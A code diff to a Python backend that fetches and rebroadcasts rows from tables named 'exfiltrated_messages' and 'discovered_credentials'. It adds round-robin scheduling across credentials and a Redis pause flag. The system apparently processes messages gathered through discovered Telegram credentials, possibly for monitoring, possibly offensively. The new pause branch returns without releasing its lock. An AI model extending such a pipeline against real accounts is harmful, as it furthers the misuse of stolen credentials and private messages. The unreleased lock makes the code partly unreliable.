@@ -203,7 +203,40 @@ def _set_broadcast_reliability_columns_available(value: bool) -> None:
     _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE = value
     _BROADCAST_RELIABILITY_LAST_CHECK = time.time()
 
+def _interleave_by_credential(rows: list[dict[str, Any]], batch_size: int) -> list[dict[str, Any]]:
+    """Round-robin rows across credentials so every topic gets served.
+
+    Per-credential order is preserved (the fetch is already ordered by
+    telegram_msg_id), so replays stay in their original sequence within a topic.
+    """
+    buckets: dict[Any, list[dict[str, Any]]] = {}
+    order: list[Any] = []
+    for row in rows:
+        credential = row.get("credential_id")
+        if credential not in buckets:
+            buckets[credential] = []
+            order.append(credential)
+        buckets[credential].append(row)
+
+    selected: list[dict[str, Any]] = []
+    depth = 0
+    while len(selected) < batch_size:
+        progressed = False
+        for credential in order:
+            bucket = buckets[credential]
+            if depth < len(bucket):
+                selected.append(bucket[depth])
+                progressed = True
+                if len(selected) >= batch_size:
+                    break
+        if not progressed:
+            break
+        depth += 1
+    return selected
+
+
 async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> list[dict[str, Any]]:
+    window = min(max(batch_size * 4, 200), 1000)
     base_query = (
         db.table("exfiltrated_messages")
         .select("*, discovered_credentials!inner(meta)")
@@ -217,10 +250,10 @@ async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> li
                 base_query
                 .or_(f"next_retry_at.is.null,next_retry_at.lte.{now_iso}")
                 .order("telegram_msg_id", desc=False)
-                .limit(batch_size)
+                .limit(window)
             )
             _set_broadcast_reliability_columns_available(True)
-            return response.data or []
+            return _interleave_by_credential(response.data or [], batch_size)
         except Exception as exc:
             if not _is_missing_broadcast_reliability_column(exc):
                 raise
@@ -237,9 +270,9 @@ async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> li
         .eq("is_broadcasted", False)
         .gte("telegram_msg_id", 0)
         .order("telegram_msg_id", desc=False)
-        .limit(batch_size)
+        .limit(window)
     )
-    return response.data or []
+    return _interleave_by_credential(response.data or [], batch_size)
 
 async def _apply_broadcast_claimed_update(
     msg_id: str,
@@ -549,6 +582,9 @@ def broadcast_pending():
         return "Skipped: Broadcast task already running (Lock active)."
 
     # Check Pause State
+    if redis_client.get("broadcast:paused"):
+        logger.warning("[Broadcast] Delivery paused via broadcast:paused; messages stay queued.")
+        return {"status": "paused", "reason": "broadcast:paused"}
     if redis_client.get("system:paused"):
         lock.release()
         return "System Paused"
